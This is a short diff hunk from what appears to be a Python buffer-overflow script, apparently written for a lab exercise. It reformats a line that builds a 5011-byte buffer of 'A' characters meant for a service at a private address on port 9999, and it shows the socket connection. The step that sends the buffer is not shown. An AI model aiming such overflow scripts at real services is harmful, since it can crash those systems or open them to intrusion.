@@ -223,7 +223,7 @@ import sys
 host = "192.168.1.201"
 port = 9999
 
-buffer = "A"*5011
+buffer = "A" * 5011
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((host,port))
